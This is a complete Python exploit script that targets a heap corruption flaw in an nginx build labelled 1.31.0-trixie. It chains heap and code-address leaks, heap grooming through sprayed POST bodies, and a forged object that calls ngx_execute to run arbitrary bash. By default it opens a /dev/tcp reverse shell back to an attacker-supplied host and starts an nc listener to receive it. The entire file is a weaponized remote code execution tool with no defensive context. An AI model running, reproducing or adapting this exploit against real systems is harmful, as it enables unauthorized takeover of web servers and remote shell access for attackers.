#!/usr/bin/env python3
"""poolslip exploit for nginx:1.31.0-trixie."""

import argparse
import select
import socket
import struct
import subprocess
import time

BODY = 850
RAW_PATCH_BYTES = {b for b in range(0x21, 0x100) if b != 0x7f}

CALL_RSI = 0x57CB2
NGX_EXECUTE = 0x5CB10
NGX_HTTP_BLOCK_READING = 0x8F920

EARLY_TARGET_POOL = 0x28840
MID_TARGET_POOL = 0xD6820
LATE_TARGET_POOL = 0xDC880

HEADER_NEXT_REL = 0x250
STATUS_LINE_LEN_REL = 0x2B0
HEAP_Q_LOWCASE_REL = 0x730
RCE_PTR_REL = 0x4F8

TARGET = ("127.0.0.1", 8080)
CMD_MAX = 0x30


def parse_args():
    parser = argparse.ArgumentParser(
        description="poolslip exploit for nginx:1.31.0-trixie"
    )
    parser.add_argument("host", nargs="?", default="127.0.0.1",
                        help="target host (default: 127.0.0.1)")
    parser.add_argument("port", nargs="?", type=int, default=8080,
                        help="target port (default: 8080)")
    parser.add_argument("--cmd",
                        help="bash command, 47 bytes max; omit for reverse shell")
    parser.add_argument("--lhost",
                        help="callback host/IP reachable from the target")
    parser.add_argument("--lport", type=int, default=1337,
                        help="callback port (default: 1337)")
    parser.add_argument("--rounds", type=int, default=80,
                        help="heap/code leak rounds per RCE attempt (default: 80)")
    parser.add_argument("--rce-retries", type=int, default=2,
                        help="full payload attempts (default: 2)")
    return parser.parse_args()


def connect_target(timeout=0.5):
    return socket.create_connection(TARGET, timeout=timeout)


def shell_command(args, lhost):
    if args.cmd:
        cmd = args.cmd.encode()
    else:
        cmd = f"sh -i >& /dev/tcp/{lhost}/{args.lport} 0>&1".encode()

    if len(cmd) + 1 > CMD_MAX:
        raise SystemExit(
            f"bash command is too long for this layout "
            f"({len(cmd) + 1}>{CMD_MAX})"
        )
    return cmd + b"\0"


def recv_all(s, timeout=1.0):
    out = b""
    s.setblocking(False)
    end = time.time() + timeout
    while time.time() < end:
        ready, _, _ = select.select([s], [], [], 0.05)
        if not ready:
            continue
        try:
            chunk = s.recv(65536)
        except BlockingIOError:
            continue
        if not chunk:
            break
        out += chunk
    s.setblocking(True)
    return out


def wait_http():
    for _ in range(40):
        try:
            with connect_target(timeout=0.2) as s:
                s.sendall(
                    b"GET /x HTTP/1.1\r\nHost: localhost\r\n"
                    b"Connection:close\r\n\r\n"
                )
                if s.recv(16).startswith(b"HTTP/"):
                    return True
        except OSError:
            time.sleep(0.03)
    return False


EARLY_BODY_BASES = (
    0x334e5,
    0x2bfc5,
    0x2a8b5,
    0x2acc5,
    0x2b2e5,
)
MID_BODY_BASES = (
    0x2a8b5,
    0x2acc5,
    0x2b2e5,
    0xddaf5,
    0xe0135,
)
LATE_BODY_BASES = (
    0xddaf5,
    0xe0135,
    0xe2775,
    0xe4db5,
    0xe73f5,
)
# RCE order is priority, not chronology.  LATE wins over MID for low pages
# where MID also fits but needs URI prepadding.
RCE_LAYOUTS = (
    (1, 0, EARLY_TARGET_POOL, EARLY_BODY_BASES, 0x200),
    (6, 5, LATE_TARGET_POOL, LATE_BODY_BASES, 0x200),
    (3, 2, MID_TARGET_POOL, MID_BODY_BASES, 0x200),
)
CODE_LEAK_LAYOUTS = (
    (1, 0, EARLY_TARGET_POOL, EARLY_BODY_BASES),
    (3, 2, MID_TARGET_POOL, MID_BODY_BASES),
    (6, 5, LATE_TARGET_POOL, LATE_BODY_BASES),
)


def raw_ok(bs):
    return all(b in RAW_PATCH_BYTES for b in bs)


def ptr_uri(ptr, prepad=0):
    bs = ptr.to_bytes(8, "little")
    if any(b == 0 for b in bs[:6]):
        return b""
    if prepad == 0:
        if bs[0] != ord("/"):
            return b""
        return b"/%" + b"%".join(f"{b:02X}".encode() for b in bs[1:6])
    return (b"/" + b"A" * (prepad - 1) + b"%"
            + b"%".join(f"{b:02X}".encode() for b in bs[:6]))


def percent_slot_from_bases(heap, need, bases, uri_prepad=0):
    for spray_i, base in enumerate(bases):
        for off in range(BODY - need + 1):
            addr = heap + base + off
            if uri_prepad == 1 and (addr & 0xff) == ord("/"):
                continue
            if ptr_uri(addr, uri_prepad):
                return addr, off, spray_i + 1
    return 0, 0, 0


def choose_pool_patch(heap, pool_off, rel, max_prepad=0):
    target_pool = heap + pool_off

    for prepad in range(max_prepad + 1):
        target = target_pool + rel - prepad
        if target < target_pool:
            break

        patch = target.to_bytes(8, "little")[:2]
        if ((target_pool + 0xca0) & ~0xffff) == (target & ~0xffff):
            if raw_ok(patch):
                return target_pool, patch, prepad

        patch = target.to_bytes(8, "little")[:3]
        if raw_ok(patch):
            return target_pool, patch, prepad

    return 0, b"", 0


def choose_rce_plan(heap):
    for triggers_n, release_i, pool_off, bases, max_prepad in RCE_LAYOUTS:
        target_pool = heap + pool_off

        for prepad in range(max_prepad + 1):
            target = target_pool + RCE_PTR_REL - prepad
            if target < target_pool:
                break

            patch = target.to_bytes(8, "little")[:2]
            if ((target_pool + 0xca0) & ~0xffff) != (target & ~0xffff):
                continue
            if not raw_ok(patch):
                continue

            fake, off, fake_sprays = percent_slot_from_bases(
                heap, 320, bases, prepad
            )
            uri = ptr_uri(fake, prepad)
            if fake and uri:
                return triggers_n, release_i, patch, prepad, fake, off, fake_sprays

    return 0, 0, b"", 0, 0, 0, 0


def layout_supported(heap):
    code_ok = False
    for _, _, pool_off, _ in CODE_LEAK_LAYOUTS:
        _, code_patch, _ = choose_pool_patch(
            heap, pool_off, HEADER_NEXT_REL, max_prepad=0x200
        )
        if code_patch:
            code_ok = True
            break

    return bool(code_ok and choose_rce_plan(heap)[2])


def open_dlast_trigger(patch):
    trig = connect_target(timeout=0.5)
    trig.sendall(b"POST /" + b"+" * 490 + b"?" + b"A" * 10 + patch
                 + b" HTTP/1.1\r\nHost: localhost\r\nContent-Length: 100000\r\n"
                 + b"Connection: keep-alive\r\nX-Hold: ")
    return trig


def respawn_worker():
    trig = None
    targets = []
    try:
        trig = connect_target(timeout=0.5)
        trig.sendall(b"POST /" + b"+" * 500 + b"?" + b"A" * 14 + b"A" * 6
                     + b" HTTP/1.1\r\nHost: localhost\r\n"
                     b"Content-Length: 100000\r\nConnection: keep-alive\r\n"
                     b"X-Hold: ")
        time.sleep(0.08)
        for _ in range(5):
            s = connect_target(timeout=0.5)
            s.sendall(b"GET / HTTP/1.1\r\nHost: localhost\r\nX-Hold: ")
            targets.append(s)
            time.sleep(0.02)
        trig.sendall(b"\r\n\r\n")
        time.sleep(0.05)
        for s in targets:
            s.close()
        time.sleep(0.3)
    except OSError:
        time.sleep(0.3)
    finally:
        for s in targets + [trig]:
            if s is None:
                continue
            try:
                s.close()
            except OSError:
                pass
    wait_http()


def direct_heap_leak_attempt(patch, layout):
    triggers_n, release_i, pool_off = layout
    print(".", end="", flush=True)

    if not wait_http():
        return 0

    trigs = []
    target = None
    try:
        for _ in range(triggers_n):
            trigs.append(open_dlast_trigger(patch))
            time.sleep(0.04)

        # Corrupt status_line so the response copies back an ngx_table_elt_t.
        headers = b"".join(b"X-%03d: %s\r\n" % (i, b"A" * 120)
                           for i in range(18))
        target = connect_target(timeout=0.5)
        target.sendall(b"GET /x HTTP/1.1\r\nHost: localhost\r\n"
                       + headers + b"0: ")
        time.sleep(0.04)

        trigs[release_i].sendall(b"\r\n\r\n")
        time.sleep(0.04)
        target.sendall(b"v\r\nQ: Z\r\n\r\n")
        r = recv_all(target, 1.0)

        prefix = b"HTTP/1.1 "
        if not r.startswith(prefix) or len(r) < len(prefix) + 48:
            return 0

        status = r[len(prefix):len(prefix) + 48]
        q = [struct.unpack("<Q", status[i:i + 8])[0]
             for i in range(0, 48, 8)]

        if q[0] != ord("q") or q[1] != 1 or q[3] != 1:
            return 0

        heap = q[5] - pool_off - HEAP_Q_LOWCASE_REL
        if heap & 0xfff:
            return 0
        return heap

    except OSError:
        time.sleep(0.04)
        return 0

    finally:
        if target is not None:
            try:
                target.close()
            except OSError:
                pass
        for trig in trigs:
            try:
                trig.close()
            except OSError:
                pass
        time.sleep(0.04)


def leak_heap_direct():
    layouts = (
        (1, 0, EARLY_TARGET_POOL),
        (3, 2, MID_TARGET_POOL),
        (6, 5, LATE_TARGET_POOL),
    )

    for _ in range(3):
        for layout in layouts:
            _, _, pool_off = layout
            for page in range(16):
                target = page * 0x1000 + pool_off + STATUS_LINE_LEN_REL
                dlast = page * 0x1000 + pool_off + 0xca0
                if target // 0x10000 != dlast // 0x10000:
                    continue
                low16 = target & 0xffff
                patch = struct.pack("<H", low16)
                if any(b not in RAW_PATCH_BYTES for b in patch):
                    continue
                heap = direct_heap_leak_attempt(patch, layout)
                if heap:
                    return heap
                respawn_worker()

    return 0


def leak_nginx_direct(heap):
    if not wait_http():
        return 0

    for triggers_n, release_i, pool_off, body_bases in CODE_LEAK_LAYOUTS:
        target_pool, patch, prepad = choose_pool_patch(
            heap, pool_off, HEADER_NEXT_REL, max_prepad=0x200
        )
        leak_fake, off, fake_min_sprays = percent_slot_from_bases(
            heap, 0x90, body_bases, prepad
        )
        uri = ptr_uri(leak_fake, prepad)
        if not target_pool or not leak_fake or not uri:
            continue

        body = bytearray(b"B" * BODY)
        body[off:off + 0x90] = b"\0" * 0x90
        struct.pack_into("<QQQ", body, off, leak_fake + 0x20, 1, 0)
        struct.pack_into("<QQQQQQQ", body, off + 0x20, 1, 1,
                         leak_fake + 0x80, 8, target_pool + 0x80, 0, 0)
        body[off + 0x80] = ord("L")

        sprays = []
        trigs = []
        target = None
        try:
            for _ in range(triggers_n):
                trigs.append(open_dlast_trigger(patch))
                time.sleep(0.04)
            time.sleep(0.08)

            target = connect_target(timeout=3)
            target.sendall(b"GET " + uri)
            time.sleep(0.08)

            trigs[release_i].sendall(b"\r\n\r\n")
            time.sleep(0.08)

            for _ in range(fake_min_sprays):
                spray = connect_target(timeout=3)
                spray.sendall(
                    b"POST /v HTTP/1.1\r\nHost: localhost\r\n"
                    b"Content-Length: 100000\r\nConnection: keep-alive\r\n\r\n"
                    + body
                )
                sprays.append(spray)
                time.sleep(0.03)

            time.sleep(0.06)
            target.sendall(b" HTTP/1.1\r\nHost: localhost\r\n"
                           b"Connection: close\r\n\r\n")

            r = recv_all(target, 2.0) + recv_all(trigs[release_i], 1.0)
            i = r.find(b"L: ")
            if i < 0 or i + 11 > len(r):
                continue

            leak = struct.unpack("<Q", r[i + 3:i + 11])[0]
            nginx = leak - NGX_HTTP_BLOCK_READING
            if nginx & 0xfff:
                continue
            return nginx

        except OSError:
            time.sleep(0.05)

        finally:
            for s in sprays + trigs + [target]:
                if s is None:
                    continue
                try:
                    s.close()
                except OSError:
                    pass
            time.sleep(0.05)

    return 0


def leak_bases(rounds):
    print("[*] heap leak: probing request-pool layouts")
    heap = 0
    nginx = 0
    last_heap = 0

    for _ in range(rounds):
        heap = leak_heap_direct()
        if not heap:
            respawn_worker()
            continue

        last_heap = heap
        low_page = (heap >> 12) & 0xf
        print(f"[+] heap  0x{heap:x} (low-page={low_page:x})")
        if not layout_supported(heap):
            raise SystemExit(
                "unsupported ASLR layout; restart the target master"
            )
        print("[*] nginx leak: crazy heap feng shui")

        for _ in range(5):
            nginx = leak_nginx_direct(heap)
            if nginx:
                break

        if nginx:
            return heap, nginx

        respawn_worker()
        print("[*] leak retry: fresh worker")

    return last_heap, 0


def fire_rce(cmdline, heap, nginx):
    if not wait_http():
        return False

    (rce_triggers_n, rce_release_i, rce_patch, rce_prepad,
     fake, off, fake_min_sprays) = choose_rce_plan(heap)
    if not rce_patch:
        return False

    print("[*] rce plan: "
          f"triggers={rce_triggers_n} release={rce_release_i} "
          f"sprays={fake_min_sprays} fake=0x{fake:x} prepad={rce_prepad}")

    body = bytearray(b"B" * BODY)
    body[off:off + 320] = b"\0" * 320

    obj = fake + 0x40
    ctx = fake + 0xA0
    argv = fake + 0xC0
    envp = fake + 0xE0
    path = fake + 0xF0
    name = fake + 0x100
    dashc = fake + 0x108
    cmdp = fake + 0x110

    struct.pack_into("<QQQ", body, off, nginx + CALL_RSI, obj, 0)
    struct.pack_into("<Q", body, off + 0x50, fake + 0x38)
    struct.pack_into("<Q", body, off + 0x70, nginx + NGX_EXECUTE)
    struct.pack_into("<Q", body, off + 0x88, ctx)
    struct.pack_into("<QQQQ", body, off + 0xA0, path, name, argv, envp)
    struct.pack_into("<QQQQ", body, off + 0xC0, path, dashc, cmdp, 0)
    body[off + 0xF0:off + 0xFa] = b"/bin/bash\0"
    body[off + 0x100:off + 0x105] = b"bash\0"
    body[off + 0x108:off + 0x10B] = b"-c\0"
    body[off + 0x110:off + 0x110 + len(cmdline)] = cmdline

    target_uri = ptr_uri(fake, rce_prepad)
    if not target_uri:
        return False

    sprays = []
    trigs = []
    target = None
    try:
        for _ in range(rce_triggers_n):
            trigs.append(open_dlast_trigger(rce_patch))
            time.sleep(0.04)
        time.sleep(0.2)

        target = connect_target(timeout=3)
        target.sendall(b"GET " + target_uri)
        time.sleep(0.12)

        trigs[rce_release_i].sendall(b"\r\n\r\n")
        time.sleep(0.08)

        for _ in range(fake_min_sprays):
            s = connect_target(timeout=3)
            s.sendall(
                b"POST /v HTTP/1.1\r\nHost: localhost\r\n"
                b"Content-Length: 100000\r\nConnection: keep-alive\r\n\r\n"
                + body
            )
            sprays.append(s)
            time.sleep(0.03)

        time.sleep(0.35)
        print("[+] payload fired", flush=True)
        target.sendall(b" HTTP/1.1\r\n\r\n")
        time.sleep(0.05)
        try:
            target.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        target.close()
        target = None
        time.sleep(1)
        return True

    except OSError:
        time.sleep(0.1)
        return False

    finally:
        for s in sprays + trigs + [target]:
            if s is None:
                continue
            try:
                s.close()
            except OSError:
                pass


def main():
    global TARGET

    args = parse_args()
    TARGET = (args.host, args.port)
    lhost = args.lhost
    if not args.cmd and not lhost:
        raise SystemExit("reverse shell requires --lhost")
    cmd = shell_command(args, lhost)

    print(f"[*] target {args.host}:{args.port}")
    if args.cmd:
        print(f"[*] cmd    {args.cmd!r}")
    else:
        print(f"[*] shell  {lhost}:{args.lport}")

    shell_mode = not args.cmd
    if shell_mode:
        print(f"[*] nc     0.0.0.0:{args.lport}")
        sh = subprocess.Popen(
            ["nc", "-lvnp", str(args.lport)],
            stderr=subprocess.DEVNULL,
        )
    else:
        sh = None

    try:
        for attempt in range(1, args.rce_retries + 1):
            if args.rce_retries > 1:
                print(f"[*] attempt {attempt}/{args.rce_retries}")

            heap, nginx = leak_bases(args.rounds)
            if not heap:
                if attempt == args.rce_retries:
                    raise SystemExit("heap leak failed")
                continue
            if not nginx:
                if attempt == args.rce_retries:
                    raise SystemExit("nginx leak failed")
                respawn_worker()
                continue

            print(f"[+] nginx 0x{nginx:x}")
            print("[*] rce")

            if not fire_rce(cmd, heap, nginx):
                if attempt == args.rce_retries:
                    raise SystemExit("rce failed")
                respawn_worker()
                continue

            if shell_mode:
                sh.wait()
                return

            if attempt < args.rce_retries:
                print("[*] payload retry: fresh worker")
                respawn_worker()
                continue
            return

        raise SystemExit("payload failed")
    finally:
        if sh is not None and sh.poll() is None:
            sh.terminate()


if __name__ == "__main__":
    main()
